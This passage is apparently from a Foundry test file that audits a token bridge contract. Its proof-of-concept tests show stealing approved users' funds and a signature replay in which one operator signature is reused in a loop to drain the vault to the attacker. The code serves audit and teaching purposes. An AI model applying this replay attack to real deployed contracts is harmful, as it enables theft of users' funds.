...
contract L1BossBridgeTest is Test {
    ...
    function test_audit_CanStealFundsFromUsersWhoApprovedBridge() public {
        // Alice approves
        vm.prank(user);
    ...
    function test_audit_CanTransferFundsFromVaultAsApprovedUser() public {
    ...
    function test_audit_CanWithdrawTokensMultipleTimes() public {
        // Set up

        uint256 attackerBalance = 100 ether;
        uint256 vaultBalance = 1000 ether;
        deal(address(token), attacker, attackerBalance);
        deal(address(token), address(vault), vaultBalance);

        // Attacker approves and deposits
        ...
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(attacker, attackerBalance),
            operator.key
        );

        // Attacker withdraws by draining the vault
        while (token.balanceOf(address(vault)) >= attackerBalance) {
            tokenBridge.withdrawTokensToL1(attacker, attackerBalance, v, r, s);
        }

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), attackerBalance + vaultBalance);
    }
}
